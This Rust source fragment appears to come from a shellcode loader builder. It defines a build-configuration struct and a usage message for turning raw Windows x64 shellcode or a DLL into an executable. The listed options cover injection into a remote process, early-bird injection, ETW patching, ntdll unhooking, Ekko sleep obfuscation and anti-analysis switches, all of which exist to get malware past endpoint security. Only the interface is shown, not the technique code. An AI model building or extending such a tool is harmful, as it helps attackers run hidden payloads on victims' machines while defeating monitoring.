pub struct BuildConfig {
    pub target:       Option<String>,
    pub spawn:        Option<String>,
    pub early_bird:   bool,
    pub aa:           bool,
    pub debug:        bool,
    pub etw_patch:    bool,
    pub unhook:       bool,
    pub sleep_obf:    bool,
    pub sleep_ms:     u32,
    pub out_name:     Option<String>,
}

pub fn usage(prog: &str) {
    eprintln!(
        "Usage: {prog} --payload <file> [options]\n\n  \
         NOTE: output is always a Windows x64 PE (.exe).\n        \
               Input payload must be Windows x64 shellcode.\n        \
               Linux/macOS payloads are NOT supported.\n\n  \
         --payload <file>      raw Windows x64 shellcode (.bin)\n  \
         --dll <file>          Windows DLL input (sRDI conversion)\n  \
         --target <proc>       remote process name (default: self)\n  \
         --inject <method>     mapping|early-bird  (default: mapping)\n  \
         --spawn <path>        spawn process for early-bird\n  \
         --no-aa               disable anti-analysis\n  \
         --debug               enable debug output\n  \
         --etw-patch           patch ETW (NtTraceEvent + EtwEventWrite)\n  \
         --unhook              unhook ntdll from disk\n  \
         --sleep-obf           enable Ekko sleep obfuscation\n  \
         --sleep-ms <N>        sleep duration in ms (default: 10000)\n  \
         --out <name>          output name without .exe"
    );
}
